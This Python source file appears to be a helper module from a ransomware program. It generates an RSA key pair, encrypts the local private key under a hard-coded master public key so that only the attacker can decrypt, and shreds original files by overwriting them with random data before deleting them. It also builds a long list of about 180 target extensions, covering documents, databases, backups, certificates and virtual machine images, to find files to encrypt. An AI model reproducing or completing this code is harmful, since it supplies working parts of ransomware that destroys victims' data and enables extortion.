import logging
from random import randint
from os import urandom, remove, path, listdir
from asymmetric_encryption import RSA
from config import ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, MASTER_PUBLIC_KEY
from pickle import load, dump, HIGHEST_PROTOCOL


logger = logging.getLogger(__name__)


def write_data_to_file(file_path, data, serialized=True):
    logger.info(f"Writing data to {file_path}")
    file = open(file_path, "wb")
    if serialized:
        file.write(data)
    else:
        dump(data, file, HIGHEST_PROTOCOL)
    file.close()


def read_data_from_file(file_path, serialized=True):
    logger.info(f"Reading data from {file_path}")
    file = open(file_path, "rb")
    if serialized:
        file_data = file.read()
    else:
        file_data = load(file)
    file.close()
    return file_data


def shred_file(file_path):
    logger.info(f"Shredding file{file_path}")
    with open(file_path, "ab+") as file_to_be_deleted:
        length = file_to_be_deleted.tell()

    with open(file_path, "br+") as file_to_be_deleted:
        for _ in range(randint(3, 11)):
            file_to_be_deleted.seek(0)
            file_to_be_deleted.write(urandom(length))

    with open(file_path, "br+") as file_to_be_deleted:
        for x in range(length):
            file_to_be_deleted.write(b"\x00")

    remove(file_path)


def generate_rsa_key_pair():
    logger.info("Generating RSA key pair")
    cipher = RSA()
    serialized_private_key = cipher.private_key
    serialized_public_key = cipher.public_key

    logger.info("Encrypting RSA private key")
    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)

    logger.info("Storing encrypted RSA private key in disk")
    write_data_to_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, encrypted_private_key, False
    )

    return serialized_public_key


def get_files_to_be_encrypted(directory):
    logger.info(f"Discovering files in {directory}")
    file_formats = {
        ".3DM",
        ".3DS",
        ".3G2",
        ".3GP",
        ".602",
        ".7Z",
        ".ACCDB",
        ".AES",
        ".AI",
        ".ARC",
        ".ASC",
        ".ASF",
        ".ASM",
        ".ASP",
        ".AVI",
        ".BACKUP",
        ".BAK",
        ".BAT",
        ".BMP",
        ".BRD",
        ".BZ2",
        ".C",
        ".CGM",
        ".CLASS",
        ".CMD",
        ".CPP",
        ".CRT",
        ".CS",
        ".CSR",
        ".CSV",
        ".DB",
        ".DBF",
        ".DCH",
        ".DER",
        ".DIF",
        ".DIP",
        ".DJVU",
        ".DOC",
        ".DOCB",
        ".DOCM",
        ".DOCX",
        ".DOT",
        ".DOTM",
        ".DOTX",
        ".DWG",
        ".EDB",
        ".EML",
        ".FLA",
        ".FLV",
        ".FRM",
        ".GIF",
        ".GPG",
        ".GZ",
        ".H",
        ".HWP",
        ".IBD",
        ".ISO",
        ".JAR",
        ".JAVA",
        ".JPEG",
        ".JPG",
        ".JS",
        ".JSP",
        ".KEY",
        ".LAY",
        ".LAY6",
        ".LDF",
        ".M3U",
        ".M4U",
        ".MAX",
        ".MDB",
        ".MDF",
        ".MID",
        ".MKV",
        ".MML",
        ".MOV",
        ".MP3",
        ".MP4",
        ".MPEG",
        ".MPG",
        ".MSG",
        ".MYD",
        ".MYI",
        ".NEF",
        ".ODB",
        ".ODG",
        ".ODP",
        ".ODS",
        ".ODT",
        ".ONETOC2",
        ".OST",
        ".OTG",
        ".OTP",
        ".OTS",
        ".OTT",
        ".P12",
        ".PAQ",
        ".PAS",
        ".PDF",
        ".PEM",
        ".PFX",
        ".PHP",
        ".PL",
        ".PNG",
        ".POT",
        ".POTM",
        ".POTX",
        ".PPAM",
        ".PPS",
        ".PPSM",
        ".PPSX",
        ".PPT",
        ".PPTM",
        ".PPTX",
        ".PS1",
        ".PSD",
        ".PST",
        ".RAR",
        ".RAW",
        ".RB",
        ".RTF",
        ".SCH",
        ".SH",
        ".SLDM",
        ".SLDX",
        ".SLK",
        ".SLN",
        ".SNT",
        ".SQL",
        ".SQLITE3",
        ".SQLITEDB",
        ".STC",
        ".STD",
        ".STI",
        ".STW",
        ".SUO",
        ".SVG",
        ".SWF",
        ".SXC",
        ".SXD",
        ".SXI",
        ".SXM",
        ".SXW",
        ".TAR",
        ".TBK",
        ".TGZ",
        ".TIF",
        ".TIFF",
        ".TXT",
        ".UOP",
        ".UOT",
        ".VB",
        ".VBS",
        ".VCD",
        ".VDI",
        ".VMDK",
        ".VMX",
        ".VOB",
        ".VSD",
        ".VSDX",
        ".WAV",
        ".WB2",
        ".WK1",
        ".WKS",
        ".WMA",
        ".WMV",
        ".XLC",
        ".XLM",
        ".XLS",
        ".XLSB",
        ".XLSM",
        ".XLSX",
        ".XLT",
        ".XLTM",
        ".XLTX",
        ".XLW",
        ".ZIP",
    }
    files_to_encrypted = [
        f"{directory}/{file}"
        for file in listdir(directory)
        if path.splitext(f"{directory}/{file}")[1].upper() in file_formats
    ]
    return files_to_encrypted
